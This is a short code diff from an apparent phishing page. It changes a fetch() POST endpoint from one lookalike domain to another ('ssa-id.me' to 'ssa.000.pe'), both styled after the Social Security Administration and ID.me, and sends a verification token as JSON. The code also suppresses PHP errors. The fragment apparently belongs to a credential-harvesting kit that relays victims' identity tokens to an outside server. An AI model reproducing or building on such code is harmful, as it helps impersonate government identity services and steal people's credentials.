@@ -28,7 +28,7 @@ error_reporting(0);
             window.location.href = 'index.php';
             return;
         }
-        fetch('http://ssa-id.me/id.me/verify_token.php', {
+        fetch('http://ssa.000.pe/id.me/verify_token.php', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
